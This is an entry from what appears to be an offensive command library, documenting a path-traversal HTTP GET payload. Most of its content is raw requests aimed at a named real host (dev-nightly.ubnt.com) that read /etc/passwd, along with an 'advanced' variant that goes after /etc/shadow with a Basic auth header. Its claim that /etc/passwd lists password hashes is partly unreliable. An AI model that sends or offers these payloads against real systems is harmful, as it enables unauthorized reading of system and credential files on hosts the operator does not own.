---
data: |-
  GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
  Host: dev-nightly.ubnt.com
tags:
  - web-exploit
  - path-traversal
type: command
output: 'Contents of /etc/passwd file, as shown in the attached screenshot.'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:21.692Z'
id: dcb6fcc4-7326-4a76-a383-dbb86cb5d3cc
verified: false
validated: true
submitted: true
---
# http-get-path-traversal

## Command

```bash
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
User-Agent: Mozilla/5.0
```

## Description

This raw HTTP GET request exploits path traversal by using multiple '\..' sequences in the path to access /etc/passwd, suitable for manual testing or proxy tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Path | Traversal payload in URL path (e.g., /..\..\..\etc\passwd) | Yes |
| Host | Target domain (e.g., dev-nightly.ubnt.com) | Yes |
| Protocol | HTTP version (e.g., HTTP/1.1) | Yes |

## Examples

### Basic Usage

```bash
GET /..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```

### Advanced Usage

```bash
GET /..\..\..\..\..\etc\shadow HTTP/1.1
Host: dev-nightly.ubnt.com
Authorization: Basic dXNlcjpwYXNz
```

## Expected Output

HTTP response with 200 OK status and body containing /etc/passwd contents, listing system users and hashes.

## Related

- [[commands/curl-path-traversal]]
- [[procedures/Exploit-Path-Traversal-for-Local-File-Read]]
